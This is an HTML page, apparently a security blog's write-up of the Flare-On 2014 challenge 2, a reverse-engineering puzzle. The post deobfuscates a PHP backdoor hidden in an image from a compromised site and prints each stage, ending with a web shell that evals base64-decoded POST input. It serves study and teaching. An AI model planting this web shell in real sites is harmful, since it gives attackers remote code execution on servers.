@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flare-On 2014 Chellage 2 // Yev&#39;s security notes</title>
+
+        <meta charset="utf-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="author" content="">
+        <meta property="og:title" content="Flare-On 2014 Chellage 2" />
+    <meta property="og:description" content="" />
+    <meta property="og:type" content="website" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:url" content="https://0xphoenix.github.io/challenges/flare/flareon_2014_2/" />
+    
+
+    <link href="" rel="alternate" type="application/rss+xml" title="Yev&#39;s security notes" />
+    <link rel="shortcut icon" href="/favicon.png">
+
+    <link href="https://0xphoenix.github.iowebfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+    <link href="https://0xphoenix.github.iowebfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://0xphoenix.github.iocss/style.css">
+
+    <link href="http://gmpg.org/xfn/11" rel="profile">
+    
+    <meta name="generator" content="Hugo 0.36" />
+</head>
+
+
+<body>
+<div id="container">
+    <header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="https://0xphoenix.github.io">Yev&#39;s security notes</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/challenges/">Challenges</a>
+                
+                <a class="main-nav-link" href="/reversing/">Reversings</a>
+                
+                <a class="main-nav-link" href="/tools/">Tools</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Flare-On 2014 Chellage 2</h1>
+        </header>
+        
+        <div class="article-meta">
+            <a href="/challenges/flare/flareon_2014_2/" class="article-date">
+                <time datetime='2014-09-23T18:52:01.000-04:00' itemprop="datePublished">2014-09-23</time>
+            </a>
+            
+            
+            <div class="post-categories">
+                <div class="article-category">
+                    
+                    
+                    <a class="article-category-link" href="https://0xphoenix.github.io/categories/challenges">Challenges</a>
+                    
+                </div>
+            </div>
+            
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            <p>In this one, flare-on.com site was attacked. The attacker left “something” behind for us to investigate. We are getting the snapshot of the site for analysis and the email is somewhere inside:</p>
+
+<p><img src="/images/flare_ch2_files.png" alt="" /></p>
+
+<p>After analysis of the original site against the challenge files, the “secret” is found in the image file (flare-on.png) and that is where the “digging” will take place:</p>
+
+<p><img src="/images/flare_ch2_data.png" alt="" /></p>
+
+<p>Let’s extract that hidden message for further processing - Stage 0:</p>
+
+<pre><code class="language-php">&lt;?php echo('SHIT'); ?&gt;
+&lt;?php
+  $terms=array(&quot;M&quot;, &quot;Z&quot;, &quot;]&quot;, &quot;p&quot;, &quot;\\&quot;, &quot;w&quot;, &quot;f&quot;, &quot;1&quot;, &quot;v&quot;, &quot;&lt;&quot;, &quot;a&quot;, &quot;Q&quot;, &quot;z&quot;, &quot; &quot;, &quot;s&quot;, &quot;m&quot;, &quot;+&quot;, &quot;E&quot;, &quot;D&quot;, &quot;g&quot;, &quot;W&quot;, &quot;\&quot;&quot;, &quot;q&quot;, &quot;y&quot;, &quot;T&quot;, &quot;V&quot;, &quot;n&quot;, &quot;S&quot;, &quot;X&quot;, &quot;)&quot;, &quot;9&quot;, &quot;C&quot;, &quot;P&quot;, &quot;r&quot;, &quot;&amp;&quot;, &quot;\'&quot;, &quot;!&quot;, &quot;x&quot;, &quot;G&quot;, &quot;:&quot;, &quot;2&quot;, &quot;~&quot;, &quot;O&quot;, &quot;h&quot;, &quot;u&quot;, &quot;U&quot;, &quot;@&quot;, &quot;;&quot;, &quot;H&quot;, &quot;3&quot;, &quot;F&quot;, &quot;6&quot;, &quot;b&quot;, &quot;L&quot;, &quot;&gt;&quot;, &quot;^&quot;, &quot;,&quot;, &quot;.&quot;, &quot;l&quot;, &quot;$&quot;, &quot;d&quot;, &quot;`&quot;, &quot;%&quot;, &quot;N&quot;, &quot;*&quot;, &quot;[&quot;, &quot;0&quot;, &quot;}&quot;, &quot;J&quot;, &quot;-&quot;, &quot;5&quot;, &quot;_&quot;, &quot;A&quot;, &quot;=&quot;, &quot;{&quot;, &quot;k&quot;, &quot;o&quot;, &quot;7&quot;, &quot;#&quot;, &quot;i&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;(&quot;, &quot;j&quot;, &quot;/&quot;, &quot;?&quot;, &quot;K&quot;, &quot;c&quot;, &quot;B&quot;, &quot;t&quot;, &quot;R&quot;, &quot;4&quot;, &quot;8&quot;, &quot;e&quot;, &quot;|&quot;);
+  $order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47); $do_me=&quot;&quot;;
+  for($i=0;$i&lt;count($order);$i++){$do_me=$do_me.$terms[$order[$i]];}
+  eval($do_me); ?&gt;}
+</code></pre>
+
+<p>Clearly, something will be evaluated <code>eval($do_me);</code> and I start from calculating <code>$do_me</code> variable by using some online php evaluator - Stage 1:</p>
+
+<pre><code class="language-php">$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';
+$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';
+$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;
+eval($___($__));
+</code></pre>
+
+<p>There are 3 variables holding the code in various encodings/obfucations:</p>
+
+<ul>
+<li>base64 encoding – <code>$S_</code>, <code>$__</code></li>
+<li>hex char representation – <code>$___</code></li>
+</ul>
+
+<p>Let’s remove the obfuscation to see the clear picture - Stage 2:</p>
+
+<pre><code class="language-php">$_='if(isset($_POST[&quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&quot;])) {
+eval(base64_decode($_POST[&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;])); }';
+
+$__='$code=base64_decode($_);eval($code);';
+
+$___=&quot;base64_decode&quot;;
+
+eval($___($__));
+</code></pre>
+
+<p>Now it’s clear what is going on and effectively the above means that the following code will be executed:</p>
+
+<pre><code>$code = &quot;
+ if(isset($_POST[&quot;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&quot;])) 
+ { 
+     eval(base64_decode($_POST[&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;])); 
+ }
+ &quot;
+eval($code);
+</code></pre>
+
+<p>Those <code>$_POST</code>s inclose “obfuscated” strings which are represented by ascii numerical values of characters and both by the way are the same. In several simple steps we get the encoded message which is the email address and again I’ll leave for you to discover the full one:</p>
+
+<p><center><strong>—–.——.java5crap@flare-on.com</strong></center></p>
+
+        </div>
+
+        
+        
+        
+
+        
+
+
+        
+        <footer class="article-footer">
+            <ul class="article-tag-list">
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="https://0xphoenix.github.io/tags/reversing">reversing
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="https://0xphoenix.github.io/tags/challenge">challenge
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="https://0xphoenix.github.io/tags/flare-on">Flare-On
+                    </a>
+                </li>
+                
+            </ul>
+        </footer>
+        
+    </div>
+    <nav id="article-nav">
+    
+    <a href="/challenges/flare/flareon_2014_1/" id="article-nav-newer" class="article-nav-link-wrap">
+        <div class="article-nav-title"><span>&lt;</span>&nbsp;
+            Flare-On 2014 Chellage 1
+        </div>
+    </a>
+    
+    
+    <a href="/challenges/flare/flareon_2014_3/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">Flare-On 2014 Chellage 3&nbsp;<span>&gt;</span></div>
+    </a>
+    
+</nav>
+</article>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2018 Yev&#39;s security notes&nbsp;
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with theme <a href="https://github.com/carsonip/hugo-theme-minos">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+</div>
+</body>
+</html>
